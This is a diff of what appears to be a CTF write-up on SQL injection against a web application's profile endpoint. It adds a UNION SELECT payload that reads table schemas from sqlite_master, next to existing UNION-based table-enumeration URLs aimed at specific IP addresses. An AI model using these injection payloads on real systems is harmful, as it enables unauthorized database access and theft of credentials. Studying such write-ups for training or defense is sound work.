@@ -191,8 +191,7 @@ http://52.66.29.74:8999/profile?username=x'UNION+SELECT+NULL,'a','a','a'--+&pass
 Enumerate tables :
 
 ```
-http://52.66.29.74:8999/profile?username=x'UNION+SELECT+NULL,NULL,tbl_name,NULL+FROM+sqlite_master+WHERE+type='table'+and+tbl_name+NOT+like+'sqlite_%' LIMIT+0,1--+&pass=admin&content=1234```
-
+http://52.66.29.74:8999/profile?username=x'UNION+SELECT+NULL,NULL,tbl_name,NULL+FROM+sqlite_master+WHERE+type='table'+and+tbl_name+NOT+like+'sqlite_%' LIMIT+0,1--+&pass=admin&content=1234
 ```
 ```
 http://52.66.29.74:8999/profile?username=x'UNION+SELECT+NULL,NULL,tbl_name,NULL+FROM+sqlite_master+WHERE+type='table'+and+tbl_name+NOT+like+'sqlite_%' LIMIT+1,1--+&pass=admin&content=1234
@@ -200,7 +199,15 @@ http://52.66.29.74:8999/profile?username=x'UNION+SELECT+NULL,NULL,tbl_name,NULL+
 ![image](https://user-images.githubusercontent.com/67979878/184501361-36d1ce83-48aa-417a-b86f-28556d00f408.png)
 
 
-we got admins,users tables , we can start enumerating columns of table admins: -> guessed pass,content columns
+we got admins,users tables , we can start enumerating columns of table admins: 
+```
+http://20.193.247.209:8555/profile?username=admin'+UNION+SELECT+NULL,NULL,GROUP_CONCAT(sql),NULL+FROM+sqlite_master+WHERE+type='table'--&pass=admin&content=a
+```
+found pass,content columns
+
+![image](https://user-images.githubusercontent.com/67979878/184502938-dcd06bbe-0329-4845-99d9-3c83ff99135f.png)
+
+
 
 
 ```
